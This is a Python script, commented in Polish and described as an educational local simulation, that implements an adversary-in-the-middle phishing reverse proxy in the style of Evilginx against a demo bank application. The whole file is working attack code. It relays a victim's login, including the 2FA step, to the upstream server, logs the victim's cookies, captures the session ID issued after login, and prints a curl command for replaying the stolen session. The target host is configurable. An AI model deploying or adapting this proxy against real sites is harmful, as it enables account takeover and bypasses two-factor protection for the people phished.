#!/usr/bin/env python3
"""
AiTM (Adversary-in-the-Middle) - symulacja phishingu przez reverse proxy (jak Evilginx).

!!! TYLKO DO CELOW EDUKACYJNYCH, URUCHAMIAJ LOKALNIE !!!

Proxy stoi MIEDZY ofiara a prawdziwym NovaBank. Ofiara wchodzi na "falszywa"
domene (localhost:7000), widzi prawdziwy interfejs banku, loguje sie (haslo + 2FA),
a proxy przekazuje wszystko do prawdziwego serwera w czasie rzeczywistym.
Gdy bank odsyla gotowe ciasteczko sesyjne PO zalogowaniu - proxy je przechwytuje.
Dlatego AiTM omija 2FA: przejmuje sesje JUZ PO uwierzytelnieniu.

  Falszywa strona dla ofiary : http://localhost:7000   (uruchom to proxy)
  Prawdziwy bank (upstream)  : http://localhost:5476   (uruchom app.py)
"""

import http.server
import http.client
import os
import sys

sys.stdout.reconfigure(line_buffering=True)  # logi na zywo, nawet przy przekierowaniu

LISTEN = int(os.environ.get("AITM_PORT", "7000"))
TARGET_HOST = os.environ.get("TARGET_HOST", "localhost")
TARGET_PORT = int(os.environ.get("TARGET_PORT", "5476"))

STOLEN = []


class Proxy(http.server.BaseHTTPRequestHandler):
    def _proxy(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else None

        # naglowki do upstream; podmieniamy Host, wycinamy kompresje (zeby dlugosc sie zgadzala)
        headers = {k: v for k, v in self.headers.items()
                   if k.lower() not in ("host", "connection", "accept-encoding")}
        headers["Host"] = "%s:%d" % (TARGET_HOST, TARGET_PORT)

        # log: ciasteczko, ktore ofiara juz wysyla przez proxy
        if self.headers.get("Cookie"):
            print("[AiTM]  ofiara -> %s %s   Cookie: %s" %
                  (self.command, self.path, self.headers.get("Cookie")))

        conn = http.client.HTTPConnection(TARGET_HOST, TARGET_PORT)
        conn.request(self.command, self.path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()

        # PRZECHWYCENIE: sesja wydana przez bank (Set-Cookie po zalogowaniu)
        for k, v in resp.getheaders():
            if k.lower() == "set-cookie" and "SESSIONID=" in v:
                sid = v.split("SESSIONID=", 1)[1].split(";", 1)[0]
                if sid and sid not in STOLEN:
                    STOLEN.append(sid)
                    print("\n" + "=" * 62)
                    print(" [AiTM]  >>> PRZECHWYCONO SESJE OFIARY <<<")
                    print("         SESSIONID = %s" % sid)
                    print("         replay:  curl http://%s:%d/dashboard -H \"Cookie: SESSIONID=%s\""
                          % (TARGET_HOST, TARGET_PORT, sid))
                    print("=" * 62 + "\n")

        # relay odpowiedzi z powrotem do ofiary (lacznie z Set-Cookie, zeby widziala normalny bank)
        self.send_response(resp.status)
        for k, v in resp.getheaders():
            if k.lower() in ("connection", "transfer-encoding", "content-length"):
                continue
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        if data:
            self.wfile.write(data)
        conn.close()

    do_GET = _proxy
    do_POST = _proxy

    def log_message(self, *a):
        pass  # wlasne, czytelniejsze logi powyzej


if __name__ == "__main__":
    print("=" * 62)
    print(" AiTM reverse proxy (symulacja Evilginx) - EDUKACYJNIE")
    print(" Falszywa strona dla ofiary : http://localhost:%d" % LISTEN)
    print(" Prawdziwy bank (upstream)  : http://%s:%d" % (TARGET_HOST, TARGET_PORT))
    print(" Kazde przejete SESSIONID pojawi sie ponizej.")
    print("=" * 62)
    http.server.ThreadingHTTPServer(("0.0.0.0", LISTEN), Proxy).serve_forever()
